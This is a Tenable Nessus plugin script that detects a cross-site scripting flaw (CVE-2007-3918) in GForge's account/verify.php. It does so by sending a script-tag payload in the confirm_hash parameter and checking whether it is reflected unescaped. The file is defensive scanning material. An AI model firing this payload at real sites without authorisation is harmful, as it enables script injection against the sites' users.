#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(26927);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2007-3918");
  script_bugtraq_id(25923, 35424);
  script_xref(name:"OSVDB", value:"37424");
  script_xref(name:"Secunia", value:"35458");

  script_name(english:"GForge account/verify.php confirm_hash Parameter XSS");
  script_summary(english:"Tries to exploit an XSS issue in GForge");

 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "The remote web server contains a PHP script that is affected by a\n",
     "cross-site scripting vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The remote host is running GForge, a web-based project for\n",
     "collaborative software development.\n\n",
     "The version of GForge installed on the remote host fails to sanitize\n",
     "user-supplied input to the 'confirm_hash' parameter of the\n",
     "'account/verify.php' script before using it to generate dynamic\n",
     "output.  An unauthenticated remote attacker may be able to leverage\n",
     "this issue to inject arbitrary HTML or script code into a user's\n",
     "browser to be executed within the security context of the affected\n",
     "site.\n\n",
     "This version may have several other vulnerabilities related to SQL\n",
     "injection and cross-site scripting, especially if the remote host is\n",
     "running a Debian build of GForge.  Nessus has not checked for these\n",
     "issues."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://gforge.org/tracker/?func=detail&atid=105&aid=3094&group_id=1"
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://www.nessus.org/u?2193dcbf"
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://lists.debian.org/debian-security-announce/2009/msg00130.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Apply the appropriate vendor patch."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N"
 );
 script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/gforge", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  if (dir == "") dir = "/";

  # Try to exploit the issue.
  xss = string("<script>alert(", SCRIPT_NAME, ")</script>");
  url = string(dir, '/account/verify.php?confirm_hash=">', urlencode(str:xss));
  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res)) exit(0);

  # There's a problem if we see our exploit.
  if (
    string('name="confirm_hash" value="">', xss, '"') >< res[2] ||
    string('name="confirm_hash" value="\\">', xss, '"') >< res[2]
  )
  {
    security_warning(port);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    exit(0);
  }
}
